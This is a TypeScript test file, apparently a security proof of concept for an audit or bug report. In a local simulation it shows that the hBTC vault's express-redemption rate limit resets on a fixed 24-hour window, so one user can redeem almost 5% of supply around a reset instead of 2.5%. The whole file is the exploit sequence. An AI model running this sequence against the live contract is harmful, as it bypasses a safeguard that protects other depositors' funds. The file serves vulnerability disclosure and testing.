// Security PoC: hBTC express withdrawal fixed-window boundary bypass.
// This test intentionally avoids Clarigen-generated bindings and calls the
// current mainnet contract sources directly through the Clarinet simnet.
import { describe, it, expect } from 'vitest';
import { Cl } from '@stacks/transactions';

const ONE_BTC = 100_000_000n;
const SBTC = 'SM3VDXK3WZZSA84XXFKAFAF15NNZX32CTSG82JFQ4.sbtc-token';
const SBTC_FUNDING = 'SM35BNE8A592DRTQ7XVF1T3KY37XEZTPGGDC8EQYP';

function ok(contract: string, fn: string, args: any[], sender: string, expected: any) {
  const tx = simnet.callPublicFn(contract, fn, args, sender);
  expect(tx.result).toBeOk(expected);
  return tx;
}

function uintRO(contract: string, fn: string, sender: string): bigint {
  const r = simnet.callReadOnlyFn(contract, fn, [], sender);
  const cv: any = r.result;
  // Direct uint getters return UIntCV. Token supply returns (ok uint).
  if (cv?.type === 'uint') return cv.value;
  if (cv?.type === 'ok' && cv.value?.type === 'uint') return cv.value.value;
  // Numeric Clarity type enums in stacks.js builds.
  if (typeof cv?.value === 'bigint') return cv.value;
  if (typeof cv?.value?.value === 'bigint') return cv.value.value;
  throw new Error(`unexpected CV from ${contract}.${fn}: ${JSON.stringify(cv)}`);
}

function requestExpress(shares: bigint, sender: string) {
  const tx = simnet.callPublicFn('vault', 'request-redeem', [Cl.uint(shares), Cl.bool(true)], sender);
  expect(tx.result.type === 'ok' || (tx.result as any).type === 7).toBe(true);
  return tx;
}

describe('hBTC express fixed-window boundary', () => {
  it('accepts almost 5% of share supply within minutes across one 24h reset boundary', () => {
    const accounts = simnet.getAccounts();
    const deployer = accounts.get('deployer')!;
    const user1 = accounts.get('wallet_6')!;
    const user2 = accounts.get('wallet_7')!;

    const vaultPrincipal = `${deployer}.vault`;
    const statePrincipal = `${deployer}.state`;

    // Minimal canonical governance setup needed by Vault -> State -> hBTC calls.
    ok('hq-hbtc', 'request-protocol-update', [Cl.principal(vaultPrincipal), Cl.bool(true)], deployer, Cl.bool(true));
    ok('hq-hbtc', 'request-protocol-update', [Cl.principal(statePrincipal), Cl.bool(true)], deployer, Cl.bool(true));
    simnet.mineEmptyBlocks(170); // > 86,400 second HQ timelock in simnet
    ok('hq-hbtc', 'confirm-protocol-request', [Cl.principal(vaultPrincipal)], deployer, Cl.bool(true));
    ok('hq-hbtc', 'confirm-protocol-request', [Cl.principal(statePrincipal)], deployer, Cl.bool(true));

    // Configure the same express settings used in production and raise only the
    // deposit cap so the test can create a round 200 BTC supply fixture.
    ok('state', 'set-deposit-cap', [Cl.uint(1000n * ONE_BTC)], deployer, Cl.bool(true));
    ok('state', 'set-express-enabled', [Cl.bool(true)], deployer, Cl.bool(true));
    ok('state', 'set-express-limit-enabled', [Cl.bool(true)], deployer, Cl.bool(true));

    // Fund the two ordinary users from the same mainnet sBTC holder used by the
    // upstream test harness. No privileged Hermetica role is given to either user.
    ok(SBTC, 'transfer', [Cl.uint(100n * ONE_BTC), Cl.principal(SBTC_FUNDING), Cl.principal(user1), Cl.none()], SBTC_FUNDING, Cl.bool(true));
    ok(SBTC, 'transfer', [Cl.uint(100n * ONE_BTC), Cl.principal(SBTC_FUNDING), Cl.principal(user2), Cl.none()], SBTC_FUNDING, Cl.bool(true));

    // 200 BTC in -> 200 BTC hBTC supply at the initial 1:1 price.
    ok('vault', 'deposit', [Cl.uint(100n * ONE_BTC), Cl.none()], user1, Cl.uint(100n * ONE_BTC));
    ok('vault', 'deposit', [Cl.uint(100n * ONE_BTC), Cl.none()], user2, Cl.uint(100n * ONE_BTC));

    const totalSupply = uintRO('token-hbtc', 'get-total-supply', deployer);
    expect(totalSupply).toBe(200n * ONE_BTC);
    const quota = totalSupply * 250n / 10_000n; // 2.5% = 5 BTC shares
    expect(quota).toBe(5n * ONE_BTC);

    // Start a fixed express window with the minimum 100-share request. This sets
    // last-express-ts and leaves essentially all of the first 2.5% quota.
    const anchor = 100n;
    requestExpress(anchor, user1);
    expect(uintRO('state', 'get-current-express-limit', deployer)).toBe(quota - anchor);

    // Each simnet block advances ~523s. 164 empty blocks plus the next request
    // execute just before the 86,400s reset boundary (about 23h58m after anchor).
    simnet.mineEmptyBlocks(164);
    const oldWindowBurst = quota - anchor;
    requestExpress(oldWindowBurst, user1);
    expect(uintRO('state', 'get-current-express-limit', deployer)).toBe(0n);

    // The very next transaction executes after the fixed-window boundary and
    // receives a completely fresh 2.5% quota. Thus two non-cancellable express
    // claims totaling almost 5% are accepted only one block apart.
    const newWindowBurst = quota;
    requestExpress(newWindowBurst, user1);

    const burst = oldWindowBurst + newWindowBurst;
    expect(burst).toBe(10n * ONE_BTC - anchor);
    expect(burst * 10_000n).toBeGreaterThan(totalSupply * 499n); // > 4.99%
  });
});
